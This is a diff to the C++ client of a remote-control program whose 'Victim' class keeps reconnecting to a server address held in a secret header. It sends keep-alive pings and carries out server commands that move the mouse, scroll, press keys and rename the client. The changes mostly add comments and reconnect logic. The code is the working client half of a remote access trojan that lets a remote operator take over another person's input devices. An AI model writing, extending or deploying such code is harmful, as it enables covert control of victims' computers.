@@ -1,4 +1,5 @@
 #include "victim.h"
+#include "../secret.h"
 
 Victim::Victim()
 {    
@@ -8,16 +9,22 @@ Victim::Victim()
     //read the context file
     std::ifstream readFile("./vcontext.txt");
     getline(readFile, name);
+
+    //remove spaces before and after name
     while (name.size() > 0 && name[0] == ' ')
         name.erase(name.begin());
     while (name.size() > 0 && name[name.size() - 1] == ' ')
         name.erase(name.begin() + name.size() - 1);
     readFile.close();
-
+    
+    //release all keys
     for (int i = 0; i < 256; i++)
         keysStates[i] = false;
+
+    //connect and initialize connection with server
     connectServer();
 
+    //start the thread that keeps the victim connected
     std::thread keepAwake(&Victim::keepAwake, this);
     keepAwake.detach();
 }
@@ -28,6 +35,7 @@ int Victim::controlVictim()
         sf::Packet p;
         server.receive(p);
 
+        //if the packet is invalid reconnect with the server
         if (p.getDataSize() == 0) {
             std::cout << "DISCONNECTED FROM SERVER\n";
             isConnected = false;
@@ -61,6 +69,7 @@ int Victim::controlVictim()
             p >> a >> b;
             float x = a / (256.f * 256.f) * screenSize.x;
             float y = b / (256.f * 256.f) * screenSize.y;
+            //move the mouse to the given position
             Mlib::Mouse::setPos(Mlib::Vec2i(x, y));
         }
         //wheel scrolled
@@ -83,9 +92,10 @@ int Victim::controlVictim()
                     Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
             }
         }
-        //rename 
+        //rename client
         else if (cmd == 'w') {
             p >> name;
+            //write the new name in the context file
             std::ofstream file("./vcontext.txt", std::ios::trunc);
             file.write(name.c_str(), name.size());
             file.close();
@@ -93,6 +103,7 @@ int Victim::controlVictim()
         //apparently victim isnt initialized
         else if (cmd == '?') {
             isConnected = false;
+            //connect and initialize again
             connectServer();
         }
     }
@@ -103,31 +114,41 @@ int Victim::controlVictim()
 void Victim::keepAwake()
 {
     while (true) {
+        //every 2 seconds send a signal to the server so not to be flagged asleep
         if (isConnected && Mlib::getTime() - lastAwakeSignal > 2'000) {
             sf::Packet p;
             p << sf::Uint8('r');
             server.send(p);
             lastAwakeSignal = Mlib::getTime();
         }
+        //sleep to save computing power
         Mlib::sleep(50);
     }
 }
 
 void Victim::connectServer()
 {
+connect:
+    //connect to server
     while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done) {}
     std::cout << "connected with server\n";
 
 init:
-    sf::Uint8 role = '-';
     sf::Packet p;
     p << sf::Uint8('v') << name;
-    server.send(p);
+    //tell server the role and the name
+    if (server.send(p) == sf::Socket::Disconnected)
+        goto connect;
+
     p.clear();
-    server.receive(p);
+    if (server.receive(p) == sf::Socket::Disconnected)
+        goto connect;
+    sf::Uint8 role = '-';
+    //check if the server has initialized the victim, else try again
     p >> role;
     if (role != 'v')
         goto init;
+    //get the connection id
     std::cout << "connection with server approved\n";
 
     isConnected = true;
